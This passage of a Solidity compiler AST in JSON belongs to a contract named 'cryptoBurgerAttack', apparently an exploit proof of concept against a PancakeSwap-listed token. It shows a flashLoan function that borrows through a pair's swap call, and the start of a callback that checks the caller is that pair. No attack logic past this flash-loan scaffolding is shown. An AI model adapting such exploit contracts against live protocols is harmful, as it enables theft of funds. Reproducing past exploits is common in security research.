                        "nodeType": "ElementaryTypeName",
                        "src": "1516:7:0",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 104,
                  "initialValue": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "arguments": [
                          {
                            "id": 100,
                            "name": "pair",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 78,
                            "src": "1546:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 99,
                          "name": "IPancakePair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1762,
                          "src": "1533:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IPancakePair_$1762_$",
                            "typeString": "type(contract IPancakePair)"
                          }
                        },
                        "id": 101,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1533:18:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakePair_$1762",
                          "typeString": "contract IPancakePair"
                        }
                      },
                      "id": 102,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "token0",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1733,
                      "src": "1533:25:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
                        "typeString": "function () view external returns (address)"
                      }
                    },
                    "id": 103,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1533:27:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1516:44:0"
                },
                {
                  "assignments": [
                    106
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 106,
                      "mutability": "mutable",
                      "name": "token1",
                      "nameLocation": "1578:6:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 148,
                      "src": "1570:14:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 105,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "1570:7:0",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 112,
                  "initialValue": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "arguments": [
                          {
                            "id": 108,
                            "name": "pair",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 78,
                            "src": "1600:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 107,
                          "name": "IPancakePair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1762,
                          "src": "1587:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IPancakePair_$1762_$",
                            "typeString": "type(contract IPancakePair)"
                          }
                        },
                        "id": 109,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1587:18:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakePair_$1762",
                          "typeString": "contract IPancakePair"
                        }
                      },
                      "id": 110,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "token1",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1738,
                      "src": "1587:25:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
                        "typeString": "function () view external returns (address)"
                      }
                    },
                    "id": 111,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1587:27:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1570:44:0"
                },
                {
                  "assignments": [
                    114
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 114,
                      "mutability": "mutable",
                      "name": "amount0Out",
                      "nameLocation": "1632:10:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 148,
                      "src": "1624:18:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 113,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "1624:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 121,
                  "initialValue": {
                    "condition": {
                      "commonType": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "id": 117,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 115,
                        "name": "_tokenBorrow",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 72,
                        "src": "1645:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "==",
                      "rightExpression": {
                        "id": 116,
                        "name": "token0",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 98,
                        "src": "1661:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "src": "1645:22:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "falseExpression": {
                      "hexValue": "30",
                      "id": 119,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "1680:1:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_0_by_1",
                        "typeString": "int_const 0"
                      },
                      "value": "0"
                    },
                    "id": 120,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "nodeType": "Conditional",
                    "src": "1645:36:0",
                    "trueExpression": {
                      "id": 118,
                      "name": "_amount",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 74,
                      "src": "1670:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1624:57:0"
                },
                {
                  "assignments": [
                    123
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 123,
                      "mutability": "mutable",
                      "name": "amount1Out",
                      "nameLocation": "1699:10:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 148,
                      "src": "1691:18:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 122,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "1691:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 130,
                  "initialValue": {
                    "condition": {
                      "commonType": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "id": 126,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 124,
                        "name": "_tokenBorrow",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 72,
                        "src": "1712:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "==",
                      "rightExpression": {
                        "id": 125,
                        "name": "token1",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 106,
                        "src": "1728:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "src": "1712:22:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "falseExpression": {
                      "hexValue": "30",
                      "id": 128,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "1747:1:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_0_by_1",
                        "typeString": "int_const 0"
                      },
                      "value": "0"
                    },
                    "id": 129,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "nodeType": "Conditional",
                    "src": "1712:36:0",
                    "trueExpression": {
                      "id": 127,
                      "name": "_amount",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 74,
                      "src": "1737:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1691:57:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 135,
                        "name": "amount0Out",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 114,
                        "src": "1796:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "id": 136,
                        "name": "amount1Out",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 123,
                        "src": "1820:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "id": 139,
                            "name": "this",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -28,
                            "src": "1852:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                              "typeString": "contract cryptoBurgerAttack"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                              "typeString": "contract cryptoBurgerAttack"
                            }
                          ],
                          "id": 138,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1844:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 137,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1844:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 140,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1844:13:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "id": 143,
                            "name": "_tokenBorrow",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 72,
                            "src": "1882:12:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          {
                            "id": 144,
                            "name": "_amount",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 74,
                            "src": "1896:7:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            },
                            {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          ],
                          "expression": {
                            "id": 141,
                            "name": "abi",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -1,
                            "src": "1871:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_abi",
                              "typeString": "abi"
                            }
                          },
                          "id": 142,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "memberName": "encode",
                          "nodeType": "MemberAccess",
                          "src": "1871:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
                            "typeString": "function () pure returns (bytes memory)"
                          }
                        },
                        "id": 145,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1871:33:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes_memory_ptr",
                          "typeString": "bytes memory"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_bytes_memory_ptr",
                          "typeString": "bytes memory"
                        }
                      ],
                      "expression": {
                        "arguments": [
                          {
                            "id": 132,
                            "name": "pair",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 78,
                            "src": "1772:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 131,
                          "name": "IPancakePair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1762,
                          "src": "1759:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IPancakePair_$1762_$",
                            "typeString": "type(contract IPancakePair)"
                          }
                        },
                        "id": 133,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1759:18:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakePair_$1762",
                          "typeString": "contract IPancakePair"
                        }
                      },
                      "id": 134,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "swap",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1761,
                      "src": "1759:23:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_uint256_$_t_address_$_t_bytes_memory_ptr_$returns$__$",
                        "typeString": "function (uint256,uint256,address,bytes memory) external"
                      }
                    },
                    "id": 146,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1759:155:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 147,
                  "nodeType": "ExpressionStatement",
                  "src": "1759:155:0"
                }
              ]
            },
            "functionSelector": "9d9e465c",
            "id": 149,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "flashLoan",
            "nameLocation": "1231:9:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 75,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 72,
                  "mutability": "mutable",
                  "name": "_tokenBorrow",
                  "nameLocation": "1249:12:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 149,
                  "src": "1241:20:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 71,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "1241:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 74,
                  "mutability": "mutable",
                  "name": "_amount",
                  "nameLocation": "1271:7:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 149,
                  "src": "1263:15:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 73,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "1263:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1240:39:0"
            },
            "returnParameters": {
              "id": 76,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1287:0:0"
            },
            "scope": 1472,
            "src": "1222:699:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "baseFunctions": [
              14
            ],
            "body": {
              "id": 1398,
              "nodeType": "Block",
              "src": "2079:10017:0",
              "statements": [
                {
                  "assignments": [
                    162
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 162,
                      "mutability": "mutable",
                      "name": "token0",
                      "nameLocation": "2097:6:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 1398,
                      "src": "2089:14:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 161,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "2089:7:0",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 169,
                  "initialValue": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "arguments": [
                          {
                            "expression": {
                              "id": 164,
                              "name": "msg",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -15,
                              "src": "2119:3:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_magic_message",
                                "typeString": "msg"
                              }
                            },
                            "id": 165,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "sender",
                            "nodeType": "MemberAccess",
                            "src": "2119:10:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 163,
                          "name": "IPancakePair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1762,
                          "src": "2106:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IPancakePair_$1762_$",
                            "typeString": "type(contract IPancakePair)"
                          }
                        },
                        "id": 166,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2106:24:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakePair_$1762",
                          "typeString": "contract IPancakePair"
                        }
                      },
                      "id": 167,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "token0",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1733,
                      "src": "2106:31:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
                        "typeString": "function () view external returns (address)"
                      }
                    },
                    "id": 168,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2106:33:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2089:50:0"
                },
                {
                  "assignments": [
                    171
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 171,
                      "mutability": "mutable",
                      "name": "token1",
                      "nameLocation": "2157:6:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 1398,
                      "src": "2149:14:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 170,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "2149:7:0",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 178,
                  "initialValue": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "arguments": [
                          {
                            "expression": {
                              "id": 173,
                              "name": "msg",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -15,
                              "src": "2179:3:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_magic_message",
                                "typeString": "msg"
                              }
                            },
                            "id": 174,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "sender",
                            "nodeType": "MemberAccess",
                            "src": "2179:10:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 172,
                          "name": "IPancakePair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1762,
                          "src": "2166:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IPancakePair_$1762_$",
                            "typeString": "type(contract IPancakePair)"
                          }
                        },
                        "id": 175,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2166:24:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakePair_$1762",
                          "typeString": "contract IPancakePair"
                        }
                      },
                      "id": 176,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "token1",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1738,
                      "src": "2166:31:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
                        "typeString": "function () view external returns (address)"
                      }
                    },
                    "id": 177,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2166:33:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2149:50:0"
                },
                {
                  "assignments": [
                    180
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 180,
                      "mutability": "mutable",
                      "name": "pair",
                      "nameLocation": "2218:4:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 1398,
                      "src": "2210:12:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 179,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "2210:7:0",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 188,
                  "initialValue": {
                    "arguments": [
                      {
                        "id": 185,
                        "name": "token0",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 162,
                        "src": "2284:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 186,
                        "name": "token1",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 171,
                        "src": "2304:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "expression": {
                        "arguments": [
                          {
                            "id": 182,
                            "name": "PANCAKE_SWAP_FACTORY",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 34,
                            "src": "2241:20:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 181,
                          "name": "IPancakeFactory",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1772,
                          "src": "2225:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IPancakeFactory_$1772_$",
                            "typeString": "type(contract IPancakeFactory)"
                          }
                        },
                        "id": 183,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2225:37:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakeFactory_$1772",
                          "typeString": "contract IPancakeFactory"
                        }
                      },
                      "id": 184,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "getPair",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1771,
                      "src": "2225:45:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_view$_t_address_$_t_address_$returns$_t_address_$",
                        "typeString": "function (address,address) view external returns (address)"
                      }
                    },
                    "id": 187,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2225:95:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2210:110:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 193,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 190,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "2339:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 191,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "src": "2339:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "id": 192,
                          "name": "pair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 180,
                          "src": "2353:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "2339:18:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "4e6f742061207061697220636f6e747261637421",
                        "id": 194,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2359:22:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_5b4592212d0bf5c501b88a4fad5457fec338aa666fc1eee4fb1ccbcfced29000",
                          "typeString": "literal_string \"Not a pair contract!\""
                        },
                        "value": "Not a pair contract!"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
